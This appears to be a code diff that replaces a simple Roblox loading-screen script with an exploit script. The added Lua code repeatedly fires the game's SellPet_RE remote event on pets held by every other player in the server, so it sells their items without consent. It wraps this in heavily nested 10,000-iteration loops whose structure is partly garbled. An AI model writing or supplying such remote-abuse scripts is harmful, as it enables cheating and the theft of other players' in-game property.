@@ -1,52 +1,30 @@
--- Create the ScreenGui
-local player = game.Players.LocalPlayer
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = player.PlayerGui
+for i = 1, 10000 do
 
--- Create the background for the loading screen
-local background = Instance.new("Frame")
-background.Size = UDim2.new(1, 0, 1, 0)
-background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-background.BackgroundTransparency = 0.5
-background.Parent = screenGui
+for i = 1, 10000 do
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
 
--- Create the loading text
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(0, 300, 0, 50)
-loadingText.Position = UDim2.new(0.5, -150, 0.5, -25)
-loadingText.Text = "Loading..."
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingText.TextSize = 24
-loadingText.TextAlign = Enum.TextAlign.Center
-loadingText.Parent = background
+local SellPetRE = ReplicatedStorage:WaitForChild("GameEvents", 9e9):WaitForChild("SellPet_RE", 9e9)
 
--- Create a loading bar
-local loadingBarBackground = Instance.new("Frame")
-loadingBarBackground.Size = UDim2.new(0, 300, 0, 25)
-loadingBarBackground.Position = UDim2.new(0.5, -150, 0.6, 0)
-loadingBarBackground.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-loadingBarBackground.Parent = background
+for i = 1, 10000 do
+    local char = LocalPlayer.Character
+    local pet = char and char:FindFirstChildOfClass("Tool")
 
-local loadingBar = Instance.new("Frame")
-loadingBar.Size = UDim2.new(0, 0, 1, 0)
-loadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-loadingBar.Parent = loadingBarBackground
-
--- Simulate loading process
-local function loadGame()
-    local loadTime = 5 -- 5 seconds for the loading process
-    
-    for i = 1, loadTime * 10 do
-        local progress = i / (loadTime * 10)
-        loadingBar.Size = UDim2.new(progress, 0, 1, 0)
-        wait(0.1)
+    if pet then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                local otherChar = player.Character
+                if otherChar then
+                    local otherPet = otherChar:FindFirstChildOfClass("Tool")
+                    if otherPet then
+                        SellPetRE:FireServer(otherPet)
+                    end
+                end
+            end
+        end
     end
-
-    -- Remove the loading screen after the "loading" is complete
-    screenGui:Destroy()
 end
-
--- Call the load function
-loadGame()
-
---- This script made by; jamal ---
+end
+end
+end
